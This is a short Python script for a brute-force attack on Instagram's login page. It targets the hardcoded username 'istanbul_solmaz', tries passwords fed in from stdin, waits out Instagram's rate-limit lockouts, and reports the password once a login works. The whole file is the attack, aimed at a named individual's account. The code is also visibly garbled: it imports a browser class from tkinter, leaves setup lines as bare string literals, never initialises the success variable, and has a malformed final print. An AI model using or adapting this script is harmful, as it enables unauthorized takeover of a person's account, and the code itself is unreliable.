#!/bin/python
from tkinter import Browser
import time
import sys
from tkinter import Browser
wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."

def logInSuccess(Browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not(Browser.is_text_present(user_err_msg) or Browser.is_text_present(pass_err_msg))

("account_username =sys.argv[1]")
"with Browser('firefox', headless=True) to with Browser('chrome', headless=True)"
Browser.visit('https://www.instagram.com')
Browser.find_by_text("Log in").first.click()
username_form = Browser.find_by_name('username').first
password_form = Browser.find_by_name('password').first
login_button = Browser.find_by_text('Log in').first
username_form.fill("istanbul_solmaz")
for password in sys.stdin:
        if len(password) < 6:
            print('Skipping password: ' + password)
            continue

        print('Testing password: ' + password)
        password_form.clear()
        password_form.fill(password)
        login_button.click()

        if Browser.is_text_present(problem_logging_in):
            print('Waiting for timeout to end.')
            time.sleep(wait_time)
            print('Timeout has ended, resuming.')
        elif logInSuccess(Browser):
            correctPassword = password
            break
if correctPassword == None:
        print("Unable to find correct password.")
else:
        print("Password for username: istanbul_solmaz  =  + password")


